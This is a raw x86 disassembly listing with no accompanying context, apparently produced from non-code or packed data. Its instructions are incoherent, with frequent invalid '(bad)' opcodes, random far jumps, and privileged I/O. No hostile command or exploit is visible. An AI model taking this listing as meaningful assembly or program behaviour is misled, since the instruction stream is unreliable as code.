  4227a1:	fadd   st,st(3)
  4227a3:	das    
  4227a4:	inc    edi
  4227a5:	std    
  4227a6:	cmp    esi,DWORD PTR [ebx+0x31]
  4227a9:	push   ds
  4227aa:	dec    edx
  4227ab:	arpl   WORD PTR [ebx+0x0],sp
  4227ae:	pop    ss
  4227af:	inc    ebx
  4227b0:	scas   eax,DWORD PTR es:[edi]
  4227b1:	sbb    DWORD PTR [ebp-0x49],edi
  4227b4:	std    
  4227b5:	aas    
  4227b6:	mov    edx,0xf8442dc0
  4227bb:	sub    edi,DWORD PTR [edx]
  4227bd:	ficom  DWORD PTR [edi+ecx*4+0x55]
  4227c1:	dec    ebp
  4227c2:	dec    edx
  4227c3:	je     0x422784
  4227c5:	ins    DWORD PTR es:[edi],dx
  4227c6:	or     DWORD PTR [ecx],esp
  4227c8:	xchg   esi,eax
  4227c9:	sbb    edx,eax
  4227cb:	push   0xded0024c
  4227d0:	jmp    0x660c:0xe9f04564
  4227d7:	xchg   esi,eax
  4227d8:	mov    dl,0x86
  4227da:	push   ebx
  4227db:	rcr    BYTE PTR [ebx+0x4d],1
  4227de:	stos   BYTE PTR es:[edi],al
  4227df:	(bad)  
  4227e0:	cdq    
  4227e1:	dec    ecx
  4227e2:	sbb    ebp,ecx
  4227e4:	pushf  
  4227e5:	fdivr  QWORD PTR [ebp+0x6e26a7c]
  4227eb:	adc    al,0x8
  4227ed:	add    BYTE PTR [ecx+ebp*1-0x2a],bh
  4227f1:	lods   al,BYTE PTR ds:[esi]
  4227f2:	nop
  4227f3:	inc    edi
  4227f4:	fcomp  DWORD PTR [esi-0x7714eb8a]
  4227fa:	push   edi
  4227fb:	icebp  
  4227fc:	or     al,0x88
  4227fe:	jnp    0x422861
  422800:	xchg   ecx,eax
  422801:	push   ebx
  422802:	sbb    al,0x41
  422804:	xchg   ebx,eax
  422805:	shr    DWORD PTR [edx-0x131726e8],1
  42280b:	in     eax,dx
  42280c:	or     edi,DWORD PTR [edx+0x42]
  42280f:	mov    esi,0x6ca632c1
  422814:	ror    DWORD PTR [edi+0x79],cl
  422817:	div    bl
  422819:	cmp    al,0x5e
  42281b:	mov    eax,0xfd07b3a4
  422820:	int    0x10
  422822:	repz cmp ch,BYTE PTR [ecx+0x6d9c5300]
  422829:	addr16 mov dh,0xdb
  42282c:	call   0x6e84c246
  422831:	(bad)  [ebx+0xd7e2]
	...
  422893:	add    BYTE PTR [eax],al
  422895:	add    ch,cl
  422897:	cmp    DWORD PTR [eax-0x10680369],edi
  42289d:	jnp    0x42284b
  42289f:	inc    ebx
  4228a0:	cmp    bl,BYTE PTR [ebx+ebp*8]
  4228a3:	cdq    
  4228a4:	mov    ebp,0x16f31a2
  4228a9:	add    BYTE PTR [edi],al
  4228ab:	add    DWORD PTR [eax],eax
  4228ad:	add    BYTE PTR [edi+ecx*2],cl
  4228b0:	sub    eax,0xf46416f0
  4228b5:	adc    DWORD PTR [esp+esi*1+0x26],eax
  4228b9:	mov    al,0x85
  4228bb:	jecxz  0x422939
  4228bd:	imul   esi,DWORD PTR [eax-0x370c4121],0xfffffff2
  4228c4:	sub    eax,0x79317fb
  4228c9:	adc    edx,DWORD PTR [edi+0x4]
  4228cc:	aam    0x5a
  4228ce:	adc    eax,0x26f9d90f
  4228d3:	mov    cs,WORD PTR [esi+0x6899fa77]
  4228d9:	frstor [eax-0x5d]
  4228dc:	push   0xa40f9da4
  4228e1:	xchg   esp,eax
  4228e2:	popf   
  4228e3:	add    eax,0x83a84d69
  4228e8:	add    al,0x39
  4228ea:	sahf   
  4228eb:	jbe    0x422960
  4228ed:	xchg   eax,ecx
  4228ef:	push   ss
  4228f0:	xchg   ebx,eax
  4228f1:	addr16 pop esi
  4228f4:	adc    esi,ebx
  4228f6:	cwde   
  4228f7:	mov    esi,0x8aa4fd7a
  4228fc:	call   0xbbfb:0x3d198e8a
  422903:	push   es
  422904:	ret    0x82db
  422907:	xlat   BYTE PTR ds:[ebx]
  422908:	inc    eax
  422909:	std    
  42290a:	push   eax
  42290b:	push   esi
  42290c:	xchg   esi,eax
  42290d:	loope  0x4228dc
  42290f:	scas   al,BYTE PTR es:[edi]
  422910:	ja     0x42296a
  422912:	inc    edx
  422913:	aad    0x9
  422915:	loope  0x4228e5
  422917:	xor    edx,DWORD PTR [edi-0x725b16dd]
  42291d:	test   eax,0x612c2c86
  422922:	sub    al,0x5b
  422924:	jp     0x422926
  422926:	xchg   ebx,eax
  422927:	mov    ds:0x4a1891,eax
  42292c:	enter  0xb42e,0x5d
  422930:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422931:	xchg   ebp,eax
  422932:	or     dh,dl
  422934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422935:	mov    ds:0xcb079cae,eax
  42293a:	inc    edi
  42293b:	ins    DWORD PTR es:[edi],dx
  42293c:	xchg   DWORD PTR [edx-0x69daeba4],ebx
  422942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422943:	ins    DWORD PTR es:[edi],dx
  422944:	and    DWORD PTR [ebp-0x21cb0ea],esi
  42294a:	enter  0xb410,0xc5
  42294e:	std    
  42294f:	mov    esi,0x32b5f008
  422954:	retf   
  422955:	xchg   cl,ah
  422957:	jmp    0x42295c
  422959:	fld    DWORD PTR [ebp-0x75]
  42295c:	sar    DWORD PTR ds:0xf17a112d,1
  422962:	xchg   edx,eax
  422963:	in     al,dx
  422964:	rol    DWORD PTR [ebx-0x6a],1
  422967:	aaa    
  422968:	cmp    bh,BYTE PTR [ecx+0x64]
  42296b:	xchg   edi,eax
  42296c:	call   0x91a9:0xb8a00d7b
  422973:	imul   cl
  422975:	out    0xb3,al
  422977:	je     0x422978
  422979:	(bad)  
  42297a:	out    0x9e,eax
  42297c:	jl     0x4229a2
  42297e:	xor    eax,0x44aada28
  422983:	mov    ah,0x6d
  422985:	jl     0x4229ed
  422987:	push   cs
  422988:	pop    esi
  422989:	arpl   WORD PTR [eax],cx
  42298b:	repz cdq 
  42298d:	pushf  
  42298e:	test   BYTE PTR [eax+0x2b78050],bh
  422994:	mov    ebx,0x55eba641
  422999:	(bad)  
  42299a:	jne    0x422a12
  42299c:	add    DWORD PTR [ebx],0xdb572ff5
  4229a2:	data16 lahf 
  4229a4:	push   cs
  4229a5:	dec    ecx
  4229a6:	push   ds
  4229a7:	mov    ecx,0xb561f3fb
  4229ac:	enter  0x4a33,0xd8
  4229b0:	iret   
  4229b1:	mov    esp,0x4eac87
	...
  422a16:	xchg   esi,eax
  422a17:	push   0x18
  422a19:	mov    ah,bh
  422a1b:	cli    
  422a1c:	xchg   esi,eax
  422a1d:	jle    0x422a63
  422a1f:	rol    ecx,1
  422a21:	call   0xa217219a
  422a26:	cmp    BYTE PTR [eax+0x1],dh
  422a29:	add    BYTE PTR [edi],al
  422a2b:	add    DWORD PTR [eax],eax
  422a2d:	add    BYTE PTR [esi+0x54],ch
  422a30:	ror    DWORD PTR [ebx],cl
  422a32:	push   ds
  422a33:	mov    ebp,0xcd0a31b2
  422a38:	scas   eax,DWORD PTR es:[edi]
  422a39:	out    dx,eax
  422a3a:	xchg   edx,eax
  422a3b:	cs fld st(2)
  422a3e:	leave  
  422a3f:	xor    BYTE PTR [ebx+0x6b],0x98
  422a43:	pop    edi
  422a44:	cld    
  422a45:	mov    ebx,0x3508560f
  422a4a:	nop
  422a4b:	jno    0x4229fe
  422a4d:	fsub   DWORD PTR [esi-0x3d]
  422a50:	inc    ebx
  422a51:	sbb    eax,0x8aea7d69
  422a56:	shl    esi,1
  422a58:	sub    dh,BYTE PTR [edx]
  422a5a:	aad    0xb6
  422a5c:	mov    ds:0xc5a69b95,al
  422a61:	repnz pushf 
  422a63:	fisttp QWORD PTR [edi+esi*1]
  422a66:	sbb    DWORD PTR [ecx+0x5c],ebp
  422a69:	jo     0x422a1b
  422a6b:	loop   0x422a9b
  422a6d:	sahf   
  422a6e:	aad    0xe5
  422a70:	mov    al,ds:0x999633ef
  422a75:	popf   
  422a76:	and    ecx,DWORD PTR [edi-0x781a17b2]
  422a7c:	mov    dl,0x38
  422a7e:	sub    BYTE PTR [esi-0x3f],0x7c
  422a82:	nop
  422a83:	mov    ebx,0x989581d3
  422a88:	jno    0x422ae4
  422a8a:	inc    eax
  422a8b:	xchg   esi,eax
  422a8c:	add    ecx,DWORD PTR [esi-0x2f]
  422a8f:	mov    cs,WORD PTR [eax]
  422a91:	gs stos BYTE PTR es:[edi],al
  422a93:	mov    eax,0xb0d6969e
  422a98:	dec    ecx
  422a99:	fisttp WORD PTR [esi-0x7a7917f7]
  422a9f:	xor    BYTE PTR [edi+edi*4+0x28],ah
  422aa3:	inc    ebp
  422aa4:	mov    dh,0x51
  422aa6:	aad    0xe8
  422aa8:	inc    esp
  422aa9:	inc    edi
  422aaa:	addr16 jl 0x422a7a
  422aad:	js     0x422ae7
  422aaf:	sahf   
  422ab0:	inc    edx
  422ab1:	and    eax,DWORD PTR [esi+0x18]
  422ab4:	push   ebp
  422ab5:	pusha  
  422ab6:	mov    ecx,0xf50dd757
  422abb:	clc    
  422abc:	(bad)
  422ac0:	cmc    
  422ac1:	sahf   
  422ac2:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422ac4:	jbe    0x422b06
  422ac6:	addr16 jge 0x422afb
  422ac9:	lods   al,BYTE PTR ds:[esi]
  422aca:	xor    al,BYTE PTR [esi-0x2da81989]
  422ad0:	and    al,0x71
  422ad2:	sub    BYTE PTR [eax+edx*4],0xbe
  422ad6:	jecxz  0x422a6d
  422ad8:	loopne 0x422b29
  422ada:	das    
  422adb:	test   dl,0xaa
  422ade:	mov    edx,0x8cf7b68b
  422ae3:	cld    
  422ae4:	jno    0x422b0e
  422ae6:	push   esp
  422ae7:	(bad)  
  422ae9:	stc    
  422aea:	fsubr  DWORD PTR [eax-0x43]
  422aed:	sub    BYTE PTR [eax],dh
  422aef:	fs jg  0x422b0d
  422af2:	xchg   DWORD PTR [edi+0x65],ecx
  422af5:	add    bh,ch
  422af7:	jge    0x422b60
  422af9:	adc    ah,BYTE PTR [ecx+0x44]
  422afc:	or     BYTE PTR [edi*1+0x20ddda7],cl
  422b03:	sub    al,0x7d
  422b05:	mov    edi,0x46b0d1b0
  422b0a:	mov    ?,WORD PTR [esi]
  422b0c:	fst    DWORD PTR [ebx-0xa]
  422b0f:	test   al,0x4c
  422b11:	mov    WORD PTR [eax],es
  422b13:	jg     0x422b82
  422b15:	sbb    DWORD PTR [ecx+esi*8-0x66],esi
  422b19:	cmp    eax,DWORD PTR [ecx-0x4d961ef1]
  422b1f:	adc    esp,ecx
  422b21:	adc    edi,eax
  422b23:	jmp    0x5688c42
  422b28:	mov    al,0x99
  422b2a:	adc    bh,ch
  422b2c:	sahf   
  422b2d:	fdivr  st,st(0)
  422b2f:	cld    
  422b30:	cli    
  422b31:	mov    WORD PTR [eax],cs
  422b33:	les    esp,FWORD PTR [ecx+0x0]
	...
  422b96:	inc    esp
  422b97:	aaa    
  422b98:	dec    edx
  422b99:	fwait
  422b9a:	jnp    0x422b9b
  422b9c:	aad    0xff
  422b9e:	push   cs
  422b9f:	adc    ebx,DWORD PTR [ecx-0x719967e4]
  422ba5:	out    dx,eax
  422ba6:	aas    
  422ba7:	jno    0x422baa
  422ba9:	add    BYTE PTR [edi],al
  422bab:	add    DWORD PTR [eax],eax
  422bad:	add    bl,bh
  422baf:	test   al,0x67
  422bb1:	push   eax
  422bb2:	(bad)  ds:0xe283f9f1
  422bb8:	push   ebp
  422bb9:	or     al,0x4c
  422bbb:	xchg   esi,eax
  422bbc:	cmp    eax,0x2b0632ec
  422bc1:	mov    eax,0x7e08933d
  422bc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bc7:	into   
  422bc8:	pop    eax
  422bc9:	mov    ds:0xaae83a1d,eax
  422bce:	sub    ah,BYTE PTR [edx]
  422bd0:	jne    0x422c3a
  422bd2:	adc    bl,BYTE PTR [edx+ebx*2-0xe]
  422bd6:	mov    bl,0x16
  422bd8:	mov    ecx,0x40279b26
  422bdd:	stc    
  422bde:	hlt    
  422bdf:	mov    DWORD PTR [edx+ebp*2+0x38],edi
  422be3:	sub    esi,DWORD PTR [esp+edi*1-0xe]
  422be7:	icebp  
  422be8:	mov    edi,0xf83e4c21
  422bed:	mov    dh,0x38
  422bef:	mov    ebp,DWORD PTR [ecx+0x364e80f7]
  422bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422bf6:	aad    0xe
  422bf8:	hlt    
  422bf9:	mov    al,ds:0xb2ff1f50
  422bfe:	rcr    BYTE PTR [edx-0x68502a98],0xf4
  422c05:	cs dec eax
  422c07:	push   ds
  422c08:	push   ecx
  422c09:	cmp    eax,edi
  422c0b:	pop    ss
  422c0c:	adc    BYTE PTR [ebp-0x35],dh
  422c0f:	mov    al,ds:0xe9fff56
  422c14:	xchg   edx,eax
  422c15:	ret    
  422c16:	cli    
  422c17:	rol    ebp,1
  422c19:	clc    
  422c1a:	mov    edx,0x106faa78
  422c1f:	mov    ch,0x26
  422c21:	mov    esp,0x11414017
  422c26:	sub    bl,BYTE PTR [ebx-0x5fef9e7f]
  422c2c:	cwde   
  422c2d:	ds pop es
  422c2f:	pop    ss
  422c30:	and    eax,0xa555dca0
  422c35:	call   0xbc62:0xa77ef12c
  422c3c:	or     al,0x5f
  422c3e:	sbb    eax,0xa7f96319
  422c43:	mov    al,ds:0xdd1d1b59
  422c48:	mov    bl,0xd8
  422c4a:	loopne 0x422bd6
  422c4c:	(bad)
  422c51:	scas   al,BYTE PTR es:[edi]
  422c52:	das    
  422c53:	mov    eax,0x28b1788e
  422c58:	sub    DWORD PTR [eax+0x2e],ebp
  422c5b:	enter  0x7400,0x55
  422c5f:	ret    
  422c60:	mov    edi,edx
  422c62:	sub    esp,DWORD PTR [esi]
  422c64:	fs jae 0x422c94
  422c67:	adc    esi,DWORD PTR [eax+0x76d6ef81]
  422c6d:	pop    es
  422c6e:	(bad)  
  422c70:	shl    eax,0xd6
  422c73:	adc    al,0xe6
  422c75:	popf   
  422c76:	rcl    al,cl
  422c78:	pop    ecx
  422c79:	xchg   ebx,eax
  422c7a:	aad    0x4c
  422c7c:	repz jmp 0x7aac9391
  422c82:	mov    ebp,0xdf6b8d74
  422c87:	sbb    eax,0xdf0de105
  422c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c8d:	enter  0xf123,0x68
  422c91:	pop    esp
  422c92:	stc    
  422c93:	lahf   
  422c94:	cmp    DWORD PTR [edx-0x3b],esi
  422c97:	push   ebx
  422c98:	rol    BYTE PTR ds:0x5c7c9ba6,cl
  422c9e:	dec    ebp
  422c9f:	mov    cs,WORD PTR [ebx]
  422ca1:	inc    edx
  422ca2:	mov    ds:0x98794a7d,eax
  422ca7:	outs   dx,DWORD PTR ds:[esi]
  422ca8:	mov    ds:0xf2f48890,al
  422cad:	sub    cl,BYTE PTR [esi-0x279ec5de]
  422cb3:	xor    ch,dh
	...
  422d15:	add    BYTE PTR [edi+0x626d60bd],bh
  422d1b:	std    
  422d1c:	mov    edi,0x26c593ff
  422d21:	fild   WORD PTR [ebx]
  422d23:	call   0x7288dd35
  422d28:	add    DWORD PTR [eax],eax
  422d2a:	pop    es
  422d2b:	add    DWORD PTR [eax],eax
  422d2d:	add    BYTE PTR [esi+eax*4],dl
  422d30:	mov    edx,0x5319d88a
  422d35:	pop    gs
  422d37:	push   ds
  422d38:	(bad)  
  422d3a:	in     al,0x40
  422d3c:	adc    DWORD PTR [ecx+0x10],0xd399482b
  422d43:	jle    0x422cf2
  422d45:	add    edx,edx
  422d47:	mov    gs,WORD PTR [edx+0x7a]
  422d4a:	out    0x9c,al
  422d4c:	test   DWORD PTR [eax],esi
  422d4e:	push   esi
  422d4f:	js     0x422dae
  422d51:	call   0x1492e59b
  422d56:	mov    ax,0x9880
  422d5a:	cmp    dl,ch
  422d5c:	test   edx,ecx
  422d5e:	push   0xb3d8844f
  422d63:	popa   
  422d64:	xchg   esi,eax
  422d65:	mov    DWORD PTR [edx+0xf],ecx
  422d68:	sub    DWORD PTR [ecx+0x31924e8b],eax
  422d6e:	call   0x6694c72f
  422d73:	mov    esp,?
  422d75:	mov    al,ds:0xdcc5c22b
  422d7a:	fidiv  DWORD PTR [eax-0x51f40608]
  422d80:	jmp    0xac27:0x670f8c83
  422d87:	neg    BYTE PTR [eax+0x1e63526f]
  422d8d:	mov    ?,WORD PTR [ecx+0x42]
  422d90:	mov    eax,ds:0x4118ea93
  422d95:	addr16 cs (bad) 
  422d98:	rcr    dh,1
  422d9a:	mov    edx,0xe44a12c5
  422d9f:	in     al,dx
  422da0:	shl    DWORD PTR [eax],1
  422da2:	push   0x795c9f23
  422da7:	out    dx,al
  422da8:	adc    DWORD PTR [eax+edi*4-0x66aadf5],ebp
  422daf:	pop    ds
  422db0:	outs   dx,DWORD PTR ds:[esi]
  422db1:	(bad)  
  422db2:	jl     0x422da2
  422db4:	(bad)  
  422db5:	jns    0x422e12
  422db7:	or     BYTE PTR [edx-0x40c36d4b],dh
  422dbd:	dec    eax
  422dbe:	fnstenv [ecx-0x5ee69310]
  422dc4:	ret    0xef36
  422dc7:	inc    eax
  422dc8:	pop    ebp
  422dc9:	inc    edx
  422dca:	in     eax,dx
  422dcb:	dec    ebp
  422dcc:	stos   DWORD PTR es:[edi],eax
  422dcd:	sbb    eax,0x251fa5e6
  422dd2:	mov    esi,eax
  422dd4:	test   BYTE PTR [ebx+eiz*2],al
  422dd7:	ror    BYTE PTR [eax],0x3b
  422dda:	pop    ebp
  422ddb:	mov    al,0x81
  422ddd:	jmp    0x422d7c
  422ddf:	xchg   esi,eax
  422de0:	jne    0x422e4d
  422de2:	adc    DWORD PTR [eax+0x58],0x1826ce20
  422de9:	repz or edi,DWORD PTR [ecx+ebp*4+0x5a]
  422dee:	ins    DWORD PTR es:[edi],dx
  422def:	sub    al,0x71
  422df1:	icebp  
  422df2:	sub    ebx,ecx
  422df4:	and    eax,0x9ecff229
  422df9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422dfa:	adc    eax,0xd03bb73
  422dff:	bnd jmp 0x422dd0
  422e02:	push   ebp
  422e03:	sbb    al,0xab
  422e05:	jne    0x422e28
  422e07:	out    0x3f,eax
  422e09:	pop    eax
  422e0a:	or     BYTE PTR [edx+0x792ddd69],al
  422e10:	or     BYTE PTR [edi],ah
  422e12:	mov    WORD PTR [ebp+0x72],es
  422e15:	or     BYTE PTR [ebx+0x6d],al
  422e18:	push   es
  422e19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e1a:	lock pop es
  422e1c:	out    0xd5,al
  422e1e:	xchg   ecx,eax
  422e1f:	xchg   edi,eax
  422e20:	or     al,0x8a
  422e22:	pop    eax
  422e23:	sub    dl,ah
  422e25:	sbb    eax,0x7371e34f
  422e2a:	rcr    BYTE PTR [edi+0x1e],1
  422e2d:	push   es
  422e2e:	xor    eax,0x6b9c0450
  422e33:	call   DWORD PTR [esi+0x0]
	...
  422e95:	add    BYTE PTR [ebx-0x21e677ab],al
  422e9b:	fst    QWORD PTR [ebx+0x2a9187df]
  422ea1:	mov    ebx,0x900c2fb2
  422ea6:	dec    ebp
  422ea7:	jae    0x422eaa
  422ea9:	add    BYTE PTR [edi],al
  422eab:	add    DWORD PTR [eax],eax
  422ead:	add    BYTE PTR [eax+0x2a],ch
  422eb0:	ret    0x92d6
  422eb3:	outs   dx,BYTE PTR ds:[esi]
  422eb4:	jmp    0x422f1e
  422eb6:	pop    esp
  422eb7:	cwde   
  422eb8:	cmp    al,0xbe
  422eba:	out    0xa,eax
  422ebc:	inc    edi
  422ebd:	jbe    0x422e66
  422ebf:	xor    al,0xa7
  422ec1:	mov    dh,BYTE PTR [edx]
  422ec3:	xor    esp,DWORD PTR [esi]
  422ec5:	les    edx,FWORD PTR ds:0x1f111dd5
  422ecb:	add    ch,ah
  422ecd:	int    0x26
  422ecf:	int    0x66
  422ed1:	push   esi
  422ed2:	daa    
  422ed3:	lds    edi,FWORD PTR [ecx-0x63]
  422ed6:	pop    ss
  422ed7:	mov    dh,0xd6
  422ed9:	mov    al,ds:0xaaf0ebf2
  422ede:	addr16 cli 
  422ee0:	sub    eax,0xba3cc423
  422ee5:	mov    edi,0x319823b8
  422eea:	cmc    
  422eeb:	(bad)  
  422eec:	cdq    
  422eed:	mov    edi,0xf902317
  422ef2:	mov    ah,0xae
  422ef4:	add    al,0xa9
  422ef6:	fsubr  st(7),st
  422ef8:	loopne 0x422e8c
  422efa:	xchg   DWORD PTR [esi],edx
  422efc:	mov    esp,0xc36e999f
  422f01:	sub    DWORD PTR [ebx],edi
  422f03:	pop    ebx
  422f04:	dec    edi
  422f05:	adc    cl,BYTE PTR [ebp-0x44]
  422f08:	adc    al,0x1
  422f0a:	leave  
  422f0b:	inc    esp
  422f0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f0d:	data16 aam 0xcc
  422f10:	sahf   
  422f11:	mov    ds:0x30b67661,eax
  422f16:	xor    BYTE PTR [ebx+edi*4-0x2a],al
  422f1a:	xor    al,0xa1
  422f1c:	daa    
  422f1d:	sub    BYTE PTR [ebp+0x3e9e97c0],dh
  422f23:	jge    0x422eb0
  422f25:	sub    DWORD PTR [esi+ecx*4],esi
  422f28:	fwait
  422f29:	pop    edi
  422f2a:	mul    DWORD PTR [esi-0x19]
  422f2d:	jle    0x422f95
  422f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f30:	rol    DWORD PTR [ecx+0x26],1
  422f33:	mov    eax,0xc2b24f7e
  422f38:	int3   
  422f39:	jl     0x422f17
  422f3b:	sti    
  422f3c:	ds jle 0x422fad
  422f3f:	cmp    DWORD PTR [ecx-0x80],ebx
  422f42:	mov    ecx,0xabfd2f26
  422f47:	aad    0x97
  422f49:	call   0xa41a:0xf06e4ecd
  422f50:	mov    es,WORD PTR [ebp-0x4019b192]
  422f56:	adc    DWORD PTR [ebp-0x5606c111],ecx
  422f5c:	jbe    0x422f11
  422f5e:	out    dx,eax
  422f5f:	int3   
  422f60:	in     al,0x29
  422f62:	mov    ah,0xc
  422f64:	jge    0x422f3d
  422f66:	aad    0x57
  422f68:	sub    DWORD PTR [bx+si+0x2d],ebx
  422f6c:	sub    BYTE PTR [eax],0xaf
  422f6f:	push   eax
  422f70:	and    ebx,ebp
  422f72:	mov    al,0x2
  422f74:	addr16 dec esp
  422f76:	jne    0x422f46
  422f78:	call   0x12a18cbf
  422f7d:	dec    esp
  422f7e:	jmp    0x7217:0xb8e5b43c
  422f85:	pop    es
  422f86:	xor    ebp,ebp
  422f88:	pop    edx
  422f89:	neg    ebp
  422f8b:	(bad)  
  422f8c:	mov    edx,0x717f14d0
  422f91:	cmp    esi,esp
  422f93:	mov    dl,0x35
  422f95:	std    
  422f96:	mov    eax,0x95714f73
  422f9b:	mov    eax,0x5ce34c2a
  422fa0:	dec    eax
  422fa1:	mov    ds:0x7dd8575f,eax
  422fa6:	mov    DWORD PTR [esi],ebx
  422fa8:	(bad)  
  422fa9:	in     al,dx
  422faa:	repnz out dx,al
  422fac:	add    BYTE PTR [ecx-0x4b],ch
  422faf:	in     al,dx
  422fb0:	stos   BYTE PTR es:[edi],al
  422fb1:	dec    ecx
  422fb2:	dec    ecx
  422fb3:	(bad)  
  422fb4:	jmp    0x0:0x0
	...
  423013:	add    BYTE PTR [eax],al
  423015:	add    BYTE PTR [esi-0x1c],al
  423018:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42301e:	lahf   
  42301f:	aaa    
  423020:	inc    ebp
  423021:	or     DWORD PTR [ebp+0x50],ebp
  423024:	cs dec edi
  423026:	push   esp
  423027:	je     0x42302a
  423029:	add    BYTE PTR [edi],al
  42302b:	add    DWORD PTR [eax],eax
  42302d:	add    dh,ch
  42302f:	daa    
  423030:	pop    ecx
  423031:	rcl    BYTE PTR fs:[edi],1
  423034:	xchg   ecx,eax
  423035:	and    eax,0x58d11a25
  42303a:	repz xchg esi,eax
  42303c:	fst    DWORD PTR [edi+0x18daeb0a]
  423042:	push   0x6a
  423044:	rol    BYTE PTR [eax*1+0x562670b9],1
  42304b:	fs js  0x42304e
  42304e:	(bad)  
  423050:	pop    edi
  423051:	hlt    
  423052:	mov    cl,0xad
  423054:	mov    ah,BYTE PTR [ebx]
  423056:	fdivr  DWORD PTR [ebx+ecx*1]
  423059:	pop    edi
  42305a:	test   DWORD PTR [ecx-0x4a86f33a],0x63e1324d
  423064:	pop    esi
  423065:	leave  
  423066:	jne    0x423035
  423068:	jb     0x4230d1
  42306a:	call   0xc81ba6e8
  42306f:	and    DWORD PTR [edx+0x17],0xffffff81
  423073:	jge    0x4230e1
  423075:	mov    ecx,0xfc23e450
  42307a:	xchg   edi,eax
  42307b:	pop    ecx
  42307c:	cmp    eax,0xd47ba595
  423081:	pop    ds
  423082:	jg     0x4230c9
  423084:	sbb    esi,ecx
  423086:	xor    eax,0x5768706f
  42308b:	mov    bl,0x91
  42308d:	cvtdq2ps xmm7,XMMWORD PTR [esi+0x34]
  423091:	cmp    dl,BYTE PTR [ecx]
  423093:	jae    0x42310e
  423095:	pop    esp
  423096:	lds    ebx,FWORD PTR [eax+0x53bd82]
  42309c:	loope  0x423024
  42309e:	dec    ebx
  42309f:	jge    0x42310d
  4230a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230a2:	inc    eax
  4230a3:	inc    edx
  4230a4:	adc    al,0x88
  4230a6:	inc    ebx
  4230a7:	stos   BYTE PTR es:[edi],al
  4230a8:	xor    al,0xdc
  4230aa:	fstp   QWORD PTR [edx]
  4230ac:	cs xor al,cl
  4230af:	sti    
  4230b0:	enter  0x70df,0x5e
  4230b4:	add    DWORD PTR [ecx],0xffffffea
  4230b7:	inc    ebx
  4230b8:	mov    al,BYTE PTR [esp+eax*8]
  4230bb:	mov    gs,edi
  4230bd:	jmp    0x42305b
  4230bf:	test   DWORD PTR ss:[esi],ebx
  4230c2:	dec    edx
  4230c3:	cmp    eax,0x6db1e1e3
  4230c8:	and    eax,0x18826295
  4230cd:	inc    ecx
  4230ce:	jb     0x4230bc
  4230d0:	mov    ebp,DWORD PTR [edi-0x54]
  4230d3:	std    
  4230d4:	stc    
  4230d5:	push   eax
  4230d6:	xchg   esp,eax
  4230d7:	xchg   edx,eax
  4230d8:	pushf  
  4230d9:	mov    bl,0x30
  4230db:	dec    eax
  4230dc:	or     dl,dl
  4230de:	xor    al,0xa4
  4230e0:	test   DWORD PTR [edi-0x28d1ea59],eax
  4230e6:	stos   BYTE PTR es:[edi],al
  4230e7:	add    BYTE PTR [ecx],bh
  4230e9:	ficom  WORD PTR [edi+0x6f]
  4230ec:	push   edx
  4230ed:	and    al,BYTE PTR [ebx-0x1811b56e]
  4230f3:	adc    dh,bh
  4230f5:	pop    ebp
  4230f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230f7:	out    dx,eax
  4230f8:	mov    bl,0xf0
  4230fa:	mov    esp,0x39223002
  4230ff:	test   DWORD PTR [eax+0x1fc062c1],esi
  423105:	sub    al,bl
  423107:	pop    esi
  423108:	out    dx,eax
  423109:	stos   DWORD PTR es:[edi],eax
  42310a:	fnclex 
  42310c:	(bad)  
  42310d:	stos   BYTE PTR es:[edi],al
  42310e:	xor    esp,DWORD PTR [edi-0x392d3b13]
  423114:	in     eax,dx
  423115:	lea    esp,[eax]
  423117:	dec    edi
  423118:	sub    BYTE PTR [ebp+0xe],bl
  42311b:	in     al,0x57
  42311d:	ins    DWORD PTR es:[edi],dx
  42311e:	repz in al,0xde
  423121:	movd   DWORD PTR [ebx],mm1
  423124:	lds    eax,FWORD PTR [esi-0x579f172c]
  42312a:	mov    bh,0xd9
  42312c:	adc    BYTE PTR [edx+0x5879dba9],0x6c
  423133:	stos   DWORD PTR es:[edi],eax
  423134:	ret    0x0
	...
  423193:	add    BYTE PTR [eax],al
  423195:	add    BYTE PTR [ecx-0xf],bh
  423198:	div    DWORD PTR [ecx-0x6804801]
  42319e:	dec    edi
  42319f:	jno    0x423168
  4231a1:	sub    BYTE PTR [esi+edi*4+0x6c],0x5a
  4231a6:	pop    ebx
  4231a7:	jne    0x4231aa
  4231a9:	add    BYTE PTR [edi],al
  4231ab:	add    DWORD PTR [eax],eax
  4231ad:	add    BYTE PTR [ebp-0x18],al
  4231b0:	push   esi
  4231b1:	das    
  4231b2:	loope  0x42313e
  4231b4:	and    BYTE PTR ds:0xa314775,ch
  4231ba:	push   ebx
  4231bb:	mov    esp,0x1669cbce
  4231c0:	cli    
  4231c1:	pop    eax
  4231c2:	jp     0x42317f
  4231c4:	mov    cs,WORD PTR [ecx]
  4231c6:	sahf   
  4231c7:	(bad)  
  4231c8:	mov    eax,ds:0x9921d2f1
  4231cd:	call   0xe9a313da
  4231d2:	pextrw esp,(bad),0xc5
  4231d4:	and    al,0xf7
  4231d6:	and    eax,0xf492c18f
  4231db:	push   esi
  4231dc:	fadd   QWORD PTR fs:[esi-0x33ce8d0b]
  4231e3:	jo     0x423223
  4231e5:	jp     0x423185
  4231e7:	inc    esi
  4231e8:	je     0x4231cd
  4231ea:	jge    0x4231cb
  4231ec:	sbb    BYTE PTR ds:0xf0e6cbe2,bh
  4231f2:	adc    al,0x3
  4231f4:	push   edi
  4231f5:	loopne 0x4231f8
  4231f7:	lds    eax,FWORD PTR [edi+eiz*4+0x1df5e337]
  4231fe:	adc    ah,cl
  423200:	test   al,0x1
  423202:	or     al,0x9d
  423204:	std    
  423205:	inc    ebx
  423206:	sar    BYTE PTR [eax-0x30],1
  423209:	int3   
  42320a:	cmp    bl,ah
